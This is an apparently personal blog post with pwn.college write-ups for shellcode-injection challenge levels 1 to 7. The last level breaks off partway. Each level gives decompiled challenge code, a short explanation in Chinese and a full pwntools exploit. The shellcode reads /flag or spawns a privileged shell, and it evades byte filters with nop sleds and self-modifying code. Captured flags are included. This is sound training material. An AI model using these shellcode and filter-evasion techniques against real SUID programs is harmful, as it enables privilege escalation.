---
title: "Write-ups: Program Security (Shellcode Injection) series (Completed)"
published: 2024-12-24
updated: 2024-12-27
description: "Write-ups for pwn.college binary exploitation series."
tags: ["Pwn", "Write-ups", "Shellcode"]
category: "Write-ups"
draft: false
---

# Level 1

## Information

- Category: Pwn

## Description

> Write and execute shellcode to read the flag!

## Write-up

```plaintext showLineNumbers=false del={8}
pwndbg> checksec
File:     /home/cub3y0nd/Projects/pwn.college/babyshell-level-1
Arch:     amd64
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX unknown - GNU_STACK missing
PIE:        PIE enabled
Stack:      Executable
RWX:        Has RWX segments
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

```c del={43, 50} collapse={1-39}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+2Ch] [rbp-1024h]
  const char **i; // [rsp+30h] [rbp-1020h]
  const char **j; // [rsp+38h] [rbp-1018h]
  _BYTE v10[16]; // [rsp+40h] [rbp-1010h] BYREF
  unsigned __int64 v11; // [rsp+1048h] [rbp-8h]

  v11 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  puts(
    "In this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every");
  puts("execution, your shellcode will need to be *position-independent*.\n");
  shellcode = v10;
  printf("Allocated 0x1000 bytes for shellcode on the stack at %p!\n", v10);
  puts("Reading 0x1000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x1000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-1.c", 0x69u, "main");
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(&byte_2565);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

够简单的吧，stack rwx，`((void (*)(void))shellcode)();` 把 `buf` 的地址强制转换为函数指针，执行我们的输入内容。

## Exploit

由于是 SUID 程序，以程序所有者权限运行。所以我们的思路是通过 `sendfile(0x1, open("/flag", 0x0, 0x0), 0x0, 0x1000)` 直接输出 `/flag` 的内容：

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, pause, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-1"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = asm(
        """
    mov rax, 0x67616c662f
    push rax
    lea rdi, [rsp]
    mov rsi, 0x0
    mov rdx, 0x0
    mov rax, 0x2
    syscall

    mov rdi, 0x1
    mov rsi, rax
    mov rdx, 0x0
    mov rcx, 0x1000
    mov rax, 0x28
    syscall

    mov rdi, 0x0
    mov rax, 0x3c
    syscall
        """
    )

    return shellcode


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=5)

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        if attack(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

还可以用 pwntools 的 shellcraft 来完成：

```python
def construct_payload():
    shellcode = shellcraft.cat("/flag")

    return asm(shellcode)
```

如果要 shell 的话可以这样写，`-p` 参数确保使用真实 `uid`、`gid` 启动 `/bin/sh`：

```python
def construct_payload():
    shellcode = shellcraft.execve("/bin/sh", ["/bin/sh", "-p"], 0)

    return asm(shellcode)
```

## Flag

Flag: `pwn.college{s4taPKpK1SzfB3gWK--PDuB4Xwx.01NxIDL5cTNxgzW}`

# Level 2

## Information

- Category: Pwn

## Description

> Write and execute shellcode to read the flag, but a portion of your input is randomly skipped.

## Write-up

```c ins={56-59} del={45, 65} collapse={1-41, 49-52}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  unsigned int v5; // eax
  int fd; // [rsp+28h] [rbp-1028h]
  int v9; // [rsp+2Ch] [rbp-1024h]
  const char **i; // [rsp+30h] [rbp-1020h]
  const char **j; // [rsp+38h] [rbp-1018h]
  _BYTE v12[16]; // [rsp+40h] [rbp-1010h] BYREF
  unsigned __int64 v13; // [rsp+1048h] [rbp-8h]

  v13 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  puts(
    "In this challenge, shellcode will be copied onto the stack and executed. Since the stack location is randomized on every");
  puts("execution, your shellcode will need to be *position-independent*.\n");
  shellcode = v12;
  printf("Allocated 0x1000 bytes for shellcode on the stack at %p!\n", v12);
  puts("Reading 0x1000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x1000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-2.c", 0x69u, "main");
  puts("Executing filter...\n");
  puts(
    "This challenge will randomly skip up to 0x800 bytes in your shellcode. You better adapt to that! One way to evade this");
  puts(
    "is to have your shellcode start with a long set of single-byte instructions that do nothing, such as `nop`, before the");
  puts(
    "actual functionality of your code begins. When control flow hits any of these instructions, they will all harmlessly");
  puts("execute and then your real shellcode will run. This concept is called a `nop sled`.\n");
  v5 = time(0LL);
  srand(v5);
  v9 = rand() % 1792 + 256;
  shellcode = (char *)shellcode + v9;
  shellcode_size -= v9;
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(&byte_2735);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

这题在上一题的基础之上加了一个简单的限制：随机生成一个 `[0, 2048)` 之内的随机数，将 shellcode 地址设置为 `buf` 起始地址加上这个随机数。所以我们要避免把实际攻击代码放在 `[0, 2048)` 这个地址区间内，通过 `nop sled` 滑过这块区间就可以轻松绕过～

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, pause, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-2"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = asm(
        """
    .rept 0x7ff
        nop
    .endr

    mov rax, 0x67616c662f
    push rax
    lea rdi, [rsp]
    mov rsi, 0x0
    mov rdx, 0x0
    mov rax, 0x2
    syscall

    mov rdi, 0x1
    mov rsi, rax
    mov rdx, 0x0
    mov rcx, 0x1000
    mov rax, 0x28
    syscall

    mov rdi, 0x0
    mov rax, 0x3c
    syscall
        """
    )

    return shellcode


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=5)

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        if attack(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

```python
def construct_payload(sled_length):
    shellcode = shellcraft.nop() * sled_length
    shellcode += shellcraft.cat("/flag")

    return asm(shellcode)
```

## Flag

Flag: `pwn.college{ws9aMHkG9tAyi31HLrmkc2LoE35.0FOxIDL5cTNxgzW}`

# Level 3

## Information

- Category: Pwn

## Description

> Write and execute shellcode to read the flag, but your inputted data is filtered before execution.

## Write-up

```c ins={45-52} del={40, 57} collapse={1-36}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+28h] [rbp-18h]
  int k; // [rsp+2Ch] [rbp-14h]
  const char **i; // [rsp+30h] [rbp-10h]
  const char **j; // [rsp+38h] [rbp-8h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  shellcode = mmap((void *)0x2CE31000, 0x1000uLL, 7, 34, 0, 0LL);
  if ( shellcode != (void *)753078272 )
    __assert_fail("shellcode == (void *)0x2ce31000", "/challenge/babyshell-level-3.c", 0x62u, "main");
  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x2CE31000);
  puts("Reading 0x1000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x1000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-3.c", 0x67u, "main");
  puts("Executing filter...\n");
  puts("This challenge requires that your shellcode have no NULL bytes!\n");
  for ( k = 0; k < (unsigned __int64)shellcode_size; ++k )
  {
    if ( !*((_BYTE *)shellcode + k) )
    {
      printf("Failed filter at byte %d!\n", k);
      exit(1);
    }
  }
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(&byte_251D);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

这次的限制是 shellcode 的机器指令中不允许出现 `\x00` 字节。这就需要我们好好利用各种指令组合来构造数据了。

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, pause, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-3"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = asm(
        """
    mov rdi, 0x67616c66
    shl rdi, 0x8
    or rdi, 0x2f
    push rdi
    lea rdi, [rsp]
    xor rsi, rsi
    xor rdx, rdx
    xor rax, rax
    or rax, 0x2
    syscall

    xor rdi, rdi
    or rdi, 0x1
    mov rsi, rax
    xor rdx, rdx
    xor r10, r10
    or r10, 0xfffffff
    xor rax, rax
    or rax, 0x28
    syscall

    dec rdi
    xor rax, rax
    or rax, 0x3c
    syscall
        """
    )

    return shellcode


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=5)

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        if attack(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

pwntools 自动生成的代码已经避免了 `\x00`，非常方便～

```python
def construct_payload():
    shellcode = shellcraft.cat("/flag")

    return asm(shellcode)
```

## Flag

Flag: `pwn.college{gZQWA0hDKCz5Xn8KrcsIiwIX2aZ.0VOxIDL5cTNxgzW}`

# Level 4

## Information

- Category: Pwn

## Description

> Write and execute shellcode to read the flag, but your inputted data is filtered before execution.

## Write-up

```c ins={45-52} del={40, 57} collapse={1-36}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+28h] [rbp-18h]
  int k; // [rsp+2Ch] [rbp-14h]
  const char **i; // [rsp+30h] [rbp-10h]
  const char **j; // [rsp+38h] [rbp-8h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  shellcode = mmap((void *)0x2D632000, 0x1000uLL, 7, 34, 0, 0LL);
  if ( shellcode != (void *)761470976 )
    __assert_fail("shellcode == (void *)0x2d632000", "/challenge/babyshell-level-4.c", 0x62u, "main");
  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x2D632000);
  puts("Reading 0x1000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x1000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-4.c", 0x67u, "main");
  puts("Executing filter...\n");
  puts("This challenge requires that your shellcode have no H bytes!\n");
  for ( k = 0; k < (unsigned __int64)shellcode_size; ++k )
  {
    if ( *((_BYTE *)shellcode + k) == 0x48 )
    {
      printf("Failed filter at byte %d!\n", k);
      exit(1);
    }
  }
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(&byte_251D);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

显然，这次不允许我们使用 64-bit 汇编写 shellcode。Why？Cuz 64-bit 汇编指令本质上就是 32-bit 汇编的拓展，大多数指令都以前缀 `0x48` 开始。easy peasy!

`push`、`pop` 指令没有 `0x48` 前缀，可以正常使用。

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, pause, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-4"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = asm(
        """
    lea ebx, [eip+0x2c]
    xor ecx, esi
    xor edx, edx
    mov eax, 0x5
    int 0x80

    mov ebx, 0x1
    mov ecx, eax
    xor edx, edx
    mov esi, 0x1000
    mov eax, 0xbb
    int 0x80

    mov ebx, 0x0
    mov eax, 0x1
    int 0x80

flag:
    .string "/flag"
        """
    )

    return shellcode


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=5)

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        if attack(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

这里再提供一种写法：

```asm
.global _start
.intel_syntax noprefix

_start:
  push 0x2f
  mov dword ptr [rsp + 1], 0x67616c66
  push rsp
  pop rdi
  xor esi, esi
  xor edx, edx
  mov al, 0x2
  syscall

  mov edi, 0x1
  mov esi, eax
  xor edx, edx
  mov r10, 0x1000
  mov al, 0x28
  syscall

  xor edi, edi
  mov al, 0x3c
  syscall
```

由于这题只是不想让我们用 64-bit 的指令，所以我们不能简单的通过 pwntools 生成 32-bit 指令来解决。这样生成出来的指令无法执行，我估计是内存对齐问题导致？因为这个程序本生是 amd64 的。

## Flag

Flag: `pwn.college{wqf2fgp7CVvoI3yhbzzsqtw5OC3.0FMyIDL5cTNxgzW}`

# Level 5

## Information

- Category: Pwn

## Description

> Write and execute shellcode to read the flag, but the inputted data cannot contain any form of system call bytes (syscall, sysenter, int), can you defeat this?

## Write-up

```c ins={50-58} del={41, 63} collapse={1-37, 45-46}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+20h] [rbp-20h]
  int k; // [rsp+24h] [rbp-1Ch]
  const char **i; // [rsp+28h] [rbp-18h]
  const char **j; // [rsp+30h] [rbp-10h]
  _WORD *v11; // [rsp+38h] [rbp-8h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  shellcode = mmap((void *)0x1A315000, 0x1000uLL, 7, 34, 0, 0LL);
  if ( shellcode != (void *)439439360 )
    __assert_fail("shellcode == (void *)0x1a315000", "/challenge/babyshell-level-5.c", 0x62u, "main");
  printf("Mapped 0x1000 bytes for shellcode at %p!\n", (const void *)0x1A315000);
  puts("Reading 0x1000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x1000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-5.c", 0x67u, "main");
  puts("Executing filter...\n");
  puts(
    "This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls");
  puts("are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05");
  puts("(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to");
  puts("insert the `syscall` instructions at runtime.\n");
  for ( k = 0; k < (unsigned __int64)shellcode_size; ++k )
  {
    v11 = (char *)shellcode + k;
    if ( *v11 == 0x80CD || *v11 == 0x340F || *v11 == 0x50F )
    {
      printf("Failed filter at byte %d!\n", k);
      exit(1);
    }
  }
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
  puts(&byte_2675);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

不让出现系统调用原语的机器码，绕过方法非常 ez 啊，请看 exp。

## Exploit

```python ins={49-50, 59-60}
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, pause, process, remote

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-5"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload():
    shellcode = """
    /* push b'/flag\x00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c662f
    xor [rsp], rax
    /* call open('rsp', 'O_RDONLY', 'rdx') */
    push 2 /* 2 */
    pop rax
    mov rdi, rsp
    xor esi, esi /* O_RDONLY */
    inc byte ptr [rip + 1]
    .byte 0x0f, 0x04
    /* call sendfile(1, 'rax', 0, 0x7fffffff) */
    mov r10d, 0x7fffffff
    mov rsi, rax
    push 40 /* 0x28 */
    pop rax
    push 1
    pop rdi
    cdq /* rdx=0 */
    inc byte ptr [rip + 1]
    .byte 0x0f, 0x04
    """

    return asm(shellcode)


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=5)

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload()

        if attack(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{AJ-22D5IQdnex2KL8LxB8zOq02R.0VMyIDL5cTNxgzW}`

# Level 6

## Information

- Category: Pwn

## Description

> Write and execute shellcode to read the flag, but the inputted data cannot contain any form of system call bytes (syscall, sysenter, int), this challenge adds an extra layer of difficulty!

## Write-up

```c ins={50-58} del={41, 70} collapse={1-37, 45-46, 62-66}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+20h] [rbp-20h]
  int k; // [rsp+24h] [rbp-1Ch]
  const char **i; // [rsp+28h] [rbp-18h]
  const char **j; // [rsp+30h] [rbp-10h]
  _WORD *v11; // [rsp+38h] [rbp-8h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(_bss_start, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
  shellcode = mmap((void *)0x26E45000, 0x2000uLL, 7, 34, 0, 0LL);
  if ( shellcode != (void *)652496896 )
    __assert_fail("shellcode == (void *)0x26e45000", "/challenge/babyshell-level-6.c", 0x62u, "main");
  printf("Mapped 0x2000 bytes for shellcode at %p!\n", (const void *)0x26E45000);
  puts("Reading 0x2000 bytes from stdin.\n");
  shellcode_size = read(0, shellcode, 0x2000uLL);
  if ( !shellcode_size )
    __assert_fail("shellcode_size > 0", "/challenge/babyshell-level-6.c", 0x67u, "main");
  puts("Executing filter...\n");
  puts(
    "This challenge requires that your shellcode does not have any `syscall`, 'sysenter', or `int` instructions. System calls");
  puts("are too dangerous! This filter works by scanning through the shellcode for the following byte sequences: 0f05");
  puts("(`syscall`), 0f34 (`sysenter`), and 80cd (`int`). One way to evade this is to have your shellcode modify itself to");
  puts("insert the `syscall` instructions at runtime.\n");
  for ( k = 0; k < (unsigned __int64)shellcode_size; ++k )
  {
    v11 = (char *)shellcode + k;
    if ( *v11 == 0x80CD || *v11 == 0x340F || *v11 == 0x50F )
    {
      printf("Failed filter at byte %d!\n", k);
      exit(1);
    }
  }
  puts("Removing write permissions from first 4096 bytes of shellcode.\n");
  if ( mprotect(shellcode, 0x1000uLL, 5) )
    __assert_fail(
      "mprotect(shellcode, 4096, PROT_READ|PROT_EXEC) == 0",
      "/challenge/babyshell-level-6.c",
      0x79u,
      "main");
  puts("This challenge is about to execute the following shellcode:\n");
  print_disassembly(shellcode, shellcode_size);
 puts(&byte_26ED);
  puts("Executing shellcode!\n");
  ((void (*)(void))shellcode)();
  puts("### Goodbye!");
  return 0;
}
```

还是没难度。首先不允许出现系统调用原语的机器码，其次会在执行 shellcode 前移除前 `0x1000` 字节区块的写权限。由于我们的 shellcode 会去修改自生的指令来绕过不允许出现系统调用原语的机器码，所以肯定不能把 shellcoded 写在前 `0x1000` 字节的区块中，因为程序读了 `0x2000` 字节，所以我们把核心代码写到前 `0x1000` 字节之后即可。至于这前 `0x1000` 字节，我们一个 `nop` 滑铲滑过去就好了。

## Exploit

```python
#!/usr/bin/python3

from pwn import ELF, asm, context, gdb, log, pause, process, remote, shellcraft

context(log_level="debug", terminal="kitty")

FILE = "./babyshell-level-6"
HOST, PORT = "localhost", 1337

gdbscript = """
c
"""


def launch(local=True, debug=False, aslr=False, argv=None, envp=None):
    if local:
        elf = ELF(FILE)
        context.binary = elf

        if debug:
            return gdb.debug(
                [elf.path] + (argv or []), gdbscript=gdbscript, aslr=aslr, env=envp
            )
        else:
            return process([elf.path] + (argv or []), env=envp)
    else:
        return remote(HOST, PORT)


def send_payload(target, payload):
    try:
        target.send(payload)
    except Exception as e:
        log.exception(f"An error occurred while sending payload: {e}")


def construct_payload(sled_length):
    shellcode = shellcraft.nop() * sled_length
    shellcode += """
    /* push b'/flag\x00' */
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x67616c662f
    xor [rsp], rax
    /* call open('rsp', 'O_RDONLY', 'rdx') */
    push 2 /* 2 */
    pop rax
    mov rdi, rsp
    xor esi, esi /* O_RDONLY */
    inc byte ptr [rip + 1]
    .byte 0x0f, 0x04
    /* call sendfile(1, 'rax', 0, 0x7fffffff) */
    mov r10d, 0x7fffffff
    mov rsi, rax
    push 40 /* 0x28 */
    pop rax
    push 1
    pop rdi
    cdq /* rdx=0 */
    inc byte ptr [rip + 1]
    .byte 0x0f, 0x04
    """

    return asm(shellcode)


def attack(target, payload):
    try:
        send_payload(target, payload)

        response = target.recvall(timeout=5)

        return b"pwn.college{" in response
    except Exception as e:
        log.exception(f"An error occurred while performing attack: {e}")


def main():
    try:
        target = launch()
        payload = construct_payload(0x1000)

        if attack(target, payload):
            log.success("Success! Exiting...")

            pause()
            exit()
    except Exception as e:
        log.exception(f"An error occurred in main: {e}")


if __name__ == "__main__":
    main()
```

## Flag

Flag: `pwn.college{kfVRmOzEaLCMSxdS_zQkxZr6BEv.0lMyIDL5cTNxgzW}`

# Level 7

## Information

- Category: Pwn

## Description

> Write and execute shellcode to read the flag, but all file descriptors (including stdin, stderr and stdout!) are closed.

## Write-up

```c ins={48-49, 52-53, 57-58} del={39, 60} collapse={1-35, 43-44}
int __fastcall main(int argc, const char **argv, const char **envp)
{
  size_t v3; // rax
  size_t v4; // rax
  int fd; // [rsp+2Ch] [rbp-14h]
  const char **i; // [rsp+30h] [rbp-10h]
  const char **j; // [rsp+38h] [rbp-8h]

  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  puts("###");
  printf("### Welcome to %s!\n", *argv);
  puts("###");
  putchar(10);
  puts(
    "This challenge reads in some bytes, modifies them (depending on the specific challenge configuration), and executes them");
  puts(
    "as code! This is a common exploitation scenario, called `code injection`. Through this series of challenges, you will");
  puts(
    "practice your shellcode writing skills under various constraints! To ensure that you are shellcoding, rather than doing");
  puts("other tricks, this will sanitize all environment variables and arguments and close all file descriptors > 2.\n");
  for ( fd = 3; fd <= 9999; ++fd )
    close(fd);
  for ( i = argv; *i; ++i )
  {
    v3 = strlen(*i);
    memset((void *)*i, 0, v3);
  }
  for ( j = envp; *j; ++j )
  {
    v4 = strlen(*j);
    memset((void *)*j, 0, v4);
  }
